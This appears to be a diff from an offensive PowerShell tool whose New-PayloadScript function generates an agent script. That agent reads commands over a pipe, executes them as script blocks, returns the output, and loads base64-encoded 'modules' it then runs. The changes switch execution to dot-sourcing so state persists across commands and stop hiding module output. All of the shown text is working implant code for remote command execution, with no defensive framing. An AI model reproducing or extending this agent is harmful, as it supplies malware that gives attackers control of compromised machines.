@@ -190,7 +190,7 @@ function New-PayloadScript {
         "while(`$$modVarLine -ne `"__MODULE_END__:`$$modVarName`"){" +
         "if(`$$modVarLine -match '^__MODULE_CHUNK__:(.+)`$'){`$$modVarBuf.Append([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(`$Matches[1])))|Out-Null};" +
         "`$$modVarLine=`$$vRd.ReadLine()};" +
-        "try{. ([scriptblock]::Create(`$$modVarBuf.ToString())) 2>&1|Out-Null}catch{};" +
+        "try{. ([scriptblock]::Create(`$$modVarBuf.ToString()))}catch{};" +
         "`$$vWr.WriteLine('$marker');`$$vWr.Flush();continue}"
     )
 
@@ -209,7 +209,7 @@ function New-PayloadScript {
             "`$$vCmd=`$$vRd.ReadLine();" +
             "if(`$$vCmd -eq 'exit'){break};" +
             "$moduleHandler;" +
-            "try{`$$vRes=& ([scriptblock]::Create(`$$vCmd)) 2>&1|Out-String;" +
+            "try{`$$vRes=. ([scriptblock]::Create(`$$vCmd)) 2>&1|Out-String;" +
             "`$$vRes -split([char]10)|%{`$$vWr.WriteLine(`$_.TrimEnd())}}catch{`$$vErr=`$_.Exception.Message;`$$vErr -split([char]10)|%{`$$vWr.WriteLine(`$_)}};" +
             "`$$vWr.WriteLine('$marker');`$$vWr.Flush()};" +
             "`$$vPipe.Close();`$$vPipe.Dispose()"
@@ -237,7 +237,7 @@ function New-PayloadScript {
             "if(`$$vCb){`$$vCb=`$false}else{`$$vCmd=`$$vRd.ReadLine()};" +
             "if(`$$vCmd -eq 'exit'-or`$null -eq `$$vCmd){break};" +
             "$moduleHandler;" +
-            "try{`$$vRes=& ([scriptblock]::Create(`$$vCmd)) 2>&1|Out-String;" +
+            "try{`$$vRes=. ([scriptblock]::Create(`$$vCmd)) 2>&1|Out-String;" +
             "`$$vRes -split([char]10)|%{`$$vWr.WriteLine(`$_.TrimEnd())}}catch{`$$vErr=`$_.Exception.Message;`$$vErr -split([char]10)|%{`$$vWr.WriteLine(`$_)}};" +
             "`$$vWr.WriteLine('$marker');`$$vWr.Flush()};" +
             "`$$vPipe.Dispose()"
